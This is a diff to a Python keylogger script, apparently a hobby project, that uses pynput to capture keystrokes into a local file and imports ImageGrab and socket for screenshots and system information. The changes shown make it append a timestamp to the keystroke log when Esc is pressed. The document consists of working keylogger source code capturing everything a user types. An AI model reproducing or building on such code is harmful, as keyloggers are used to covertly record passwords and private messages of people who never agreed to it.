@@ -1,3 +1,4 @@
+# For now this keylogger notes the keystrokes and when we end the command to stop the file it notes the time, takes screenshot, notes the systeminfo
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
 import socket
@@ -8,7 +9,9 @@ keylog = 'keylogger.txt'
 scrshot = 'screenshot.png'
 count = 0
 keys = []
-currenttime = time.time()
+ttime = time.time()
+currenttime = str(ttime)
+
 def on_press(key) :
     global keys, count
     print(key)
@@ -21,11 +24,13 @@ def on_press(key) :
 
 def on_release(key) :
     if key == Key.esc :
-        print('\n' + currenttime )
+        with open(filepath + keylog, "a") as f :
+             f.write('\n')
+             f.write(currenttime)
         return False
 
 def writefile(keys):
-    with open(filepath + keylog, "a") as f:
+    with open(filepath + keylog, "a") as f :
         for key in keys:
             if key == Key.space:
                 f.write(' ')
